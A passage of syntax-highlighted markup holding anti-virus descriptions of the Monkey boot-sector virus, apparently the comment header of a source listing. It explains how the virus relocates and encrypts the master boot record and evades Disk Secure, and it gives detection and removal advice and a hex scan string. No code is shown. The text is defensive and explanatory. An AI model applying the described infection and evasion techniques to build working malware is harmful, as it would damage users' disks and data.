</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0"> </span><span class="sc5">checks</span><span class="sc0"> </span><span class="sc5">whether</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk.</span><span class="sc0">  </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">puts</span><span class="sc0"> </span><span class="sc5">itself</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rather</span><span class="sc0"> </span><span class="sc5">than</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">slightly</span><span class="sc0">
</span><span class="sc5">modifies</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">load</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">after</span><span class="sc0">
</span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">checked</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">loaded</span><span class="sc0"> </span><span class="sc5">itself.</span><span class="sc0">  </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">monkey</span><span class="sc0">
</span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0"> </span><span class="sc5">themselves</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">above</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0">
</span><span class="sc2">200h.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">save</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">place</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">so</span><span class="sc0">
</span><span class="sc9">if</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0"> </span><span class="sc5">infected</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">claims</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
</span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">unable</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">drive</span><span class="sc0"> </span><span class="sc5">partitions.</span><span class="sc0">  </span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">DIR</span><span class="sc0"> </span><span class="sc10">C</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc3">"Invalid drive specification"</span><span class="sc5">.</span><span class="sc0">

</span><span class="sc5">Detection</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">popular</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">scanning</span><span class="sc0"> </span><span class="sc5">products</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc2">2.04</span><span class="sc0"> </span><span class="sc5">finds</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">calling</span><span class="sc0"> </span><span class="sc5">them</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc3">"New variant of stoned"</span><span class="sc5">.</span><span class="sc0">  </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0">
</span><span class="sc5">identify</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc10">memory</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">well.</span><span class="sc0">  </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">F</span><span class="sc4">-</span><span class="sc5">PROT</span><span class="sc0"> </span><span class="sc5">Virstop</span><span class="sc0"> </span><span class="sc5">driver</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">recognise</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc4">-</span><span class="sc5">up.</span><span class="sc0">

</span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0"> </span><span class="sc5">v.</span><span class="sc0"> </span><span class="sc2">1.15a</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ds115a.zip</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">CHKSEC</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0">
</span><span class="sc5">notice</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">presence</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses.</span><span class="sc0">  </span><span class="sc5">Notice</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">Disk</span><span class="sc0"> </span><span class="sc5">Secure</span><span class="sc0">
</span><span class="sc5">itself</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">detect</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">infection</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">important</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">CHKSEC</span><span class="sc0">
</span><span class="sc5">command</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">called</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">autoexec.bat</span><span class="sc0"> </span><span class="sc5">file.</span><span class="sc0">

</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">simplest</span><span class="sc0"> </span><span class="sc5">detection</span><span class="sc0"> </span><span class="sc5">still</span><span class="sc0"> </span><span class="sc5">involves</span><span class="sc0"> </span><span class="sc5">recognizing</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc2">1k</span><span class="sc0"> </span><span class="sc5">decrease</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0">
</span><span class="sc5">memory.</span><span class="sc0">  </span><span class="sc5">CHKDSK</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">MEM</span><span class="sc0"> </span><span class="sc5">will</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc2">1k</span><span class="sc0"> </span><span class="sc5">less</span><span class="sc0"> </span><span class="sc13">"total conventional
</span><span class="sc10">memory</span><span class="sc13">" than normal.
</span><span class="sc0">
</span><span class="sc5">A</span><span class="sc0"> </span><span class="sc5">special</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">viruses</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">called</span><span class="sc0">
</span><span class="sc5">KILLMONK</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">been</span><span class="sc0"> </span><span class="sc5">written</span><span class="sc0"> </span><span class="sc9">at</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">University</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Alberta.</span><span class="sc0">  </span><span class="sc5">I</span><span class="sc0"> </span><span class="sc5">hope</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
</span><span class="sc5">make</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">available</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">community</span><span class="sc0"> </span><span class="sc5">shortly.</span><span class="sc0">

</span><span class="sc5">Removal</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">undocumented</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">MBR</span><span class="sc0"> </span><span class="sc9">option</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">FDISK</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc5">remove</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0">
</span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">provided</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">floppy</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc5">but</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">correct</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">values.</span><span class="sc0">  </span><span class="sc5">The</span><span class="sc0">
</span><span class="sc5">problem</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">place</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
</span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">encoded</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc2">3.</span><span class="sc0">

</span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">previously</span><span class="sc0"> </span><span class="sc5">saved</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">copy</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">clean</span><span class="sc0">
</span><span class="sc5">MBR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">restored.</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">Many</span><span class="sc0"> </span><span class="sc5">anti</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">products</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">an</span><span class="sc0">
</span><span class="sc5">automated</span><span class="sc0"> </span><span class="sc5">way</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">doing</span><span class="sc0"> </span><span class="sc5">this.</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc9">If</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t have a copy of the
</span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">MBR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">don</span><span class="sc13">'t know what values your partition table should
</span><span class="sc5">have</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0"> </span><span class="sc5">program</span><span class="sc0"> </span><span class="sc5">may</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">what</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc0"> </span><span class="sc5">need.</span><span class="sc0">

</span><span class="sc5">To</span><span class="sc0"> </span><span class="sc5">restore</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Padgett</span><span class="sc0"> </span><span class="sc5">Peterson</span><span class="sc13">'s FIXFBR works very well,
</span><span class="sc5">though</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">doesn</span><span class="sc13">'t recognize that the disk is infected.  Another
</span><span class="sc5">alternative</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">KILLMONK</span><span class="sc0"> </span><span class="sc5">program.</span><span class="sc0">

</span><span class="sc5">Scan</span><span class="sc0"> </span><span class="sc5">String</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">following</span><span class="sc0"> </span><span class="sc5">hexidecimal</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">both</span><span class="sc0"> </span><span class="sc5">variants</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Monkey.</span><span class="sc0">  </span><span class="sc5">It</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
</span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">code</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc10">uses</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">recognize</span><span class="sc0"> </span><span class="sc5">itself.</span><span class="sc0">
   </span><span class="sc2">26</span><span class="sc0"> </span><span class="sc2">81</span><span class="sc0"> </span><span class="sc5">bf</span><span class="sc0"> </span><span class="sc5">fa</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0"> </span><span class="sc2">92</span><span class="sc0"> </span><span class="sc5">c3</span><span class="sc0"> </span><span class="sc2">26</span><span class="sc0"> </span><span class="sc2">81</span><span class="sc0"> </span><span class="sc5">bf</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0"> </span><span class="sc2">61</span><span class="sc0">

</span><span class="sc5">Tim</span><span class="sc0">

  </span><span class="sc1">;   From F-PROT</span><span class="sc0">

 </span><span class="sc9">Name</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0">
 </span><span class="sc9">Type</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0">  </span><span class="sc5">MBR</span><span class="sc0">  </span><span class="sc5">Stealth</span><span class="sc0">

 </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0"> </span><span class="sc5">discovered</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">Edmonton</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Canada</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0">
 </span><span class="sc5">year</span><span class="sc0"> </span><span class="sc2">1991.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">spread</span><span class="sc0"> </span><span class="sc5">quickly</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">USA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Australia</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">UK.</span><span class="sc0">
 </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">one</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">most</span><span class="sc0"> </span><span class="sc9">common</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc0"> </span><span class="sc5">viruses.</span><span class="sc0">

 </span><span class="sc5">As</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc9">name</span><span class="sc0"> </span><span class="sc5">indicates</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">distant</span><span class="sc0"> </span><span class="sc5">relative</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Stoned.</span><span class="sc0">
 </span><span class="sc5">Its</span><span class="sc0"> </span><span class="sc5">technical</span><span class="sc0"> </span><span class="sc5">properties</span><span class="sc0"> </span><span class="sc5">make</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">quite</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">remarkable</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc5">however.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">infects</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc5">Records</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disks</span><span class="sc0">
 </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc0"> </span><span class="sc5">records</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">diskettes</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">just</span><span class="sc0"> </span><span class="sc5">like</span><span class="sc0"> </span><span class="sc5">Stoned.</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0">
 </span><span class="sc5">spreads</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc0"> </span><span class="sc5">through</span><span class="sc0"> </span><span class="sc5">diskettes.</span><span class="sc0">

 </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">does</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">let</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">original</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0"> </span><span class="sc5">remain</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0">
 </span><span class="sc5">proper</span><span class="sc0"> </span><span class="sc5">place</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">as</span><span class="sc0"> </span><span class="sc5">Stoned</span><span class="sc0"> </span><span class="sc5">does.</span><span class="sc0"> </span><span class="sc5">Instead</span><span class="sc0">
 </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">moves</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">whole</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc13">'s third
</span><span class="sc0"> </span><span class="sc5">sector</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">replaces</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">its</span><span class="sc0"> </span><span class="sc5">own</span><span class="sc0"> </span><span class="sc5">code.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
 </span><span class="sc5">inaccesible</span><span class="sc0"> </span><span class="sc5">after</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">diskette</span><span class="sc0"> </span><span class="sc5">boot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">since</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">operating</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc0">
 </span><span class="sc5">cannot</span><span class="sc0"> </span><span class="sc5">find</span><span class="sc0"> </span><span class="sc5">valid</span><span class="sc0"> </span><span class="sc5">partition</span><span class="sc0"> </span><span class="sc5">data</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">
 </span><span class="sc5">attempts</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">use</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">result</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">DOS</span><span class="sc0"> </span><span class="sc10">error</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc0">
 </span><span class="sc3">"Invalid drive specification"</span><span class="sc5">.</span><span class="sc0">

 </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0">
 </span><span class="sc5">executed</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">hard</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">can</span><span class="sc0"> </span><span class="sc5">thereafter</span><span class="sc0"> </span><span class="sc5">be</span><span class="sc0"> </span><span class="sc5">used</span><span class="sc0">
 </span><span class="sc5">normally.</span><span class="sc0"> </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">therefore</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">easily</span><span class="sc0"> </span><span class="sc5">noticeable</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">unless</span><span class="sc0">
 </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">computer</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">booted</span><span class="sc0"> </span><span class="sc5">from</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0"> </span><span class="sc5">diskette.</span><span class="sc0">

 </span><span class="sc5">The</span><span class="sc0"> </span><span class="sc5">fact</span><span class="sc0"> </span><span class="sc5">that</span><span class="sc0"> </span><span class="sc5">Monkey</span><span class="sc0"> </span><span class="sc5">encrypts</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">Master</span><span class="sc0"> </span><span class="sc5">Boot</span><span class="sc0"> </span><span class="sc9">Record</span><span class="sc0"> </span><span class="sc5">besides</span><span class="sc0">
 </span><span class="sc5">relocating</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc5">makes</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">virus</span><span class="sc0"> </span><span class="sc5">still</span><span class="sc0"> </span><span class="sc5">more</span><span class="sc0"> </span><span class="sc5">difficult</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0">
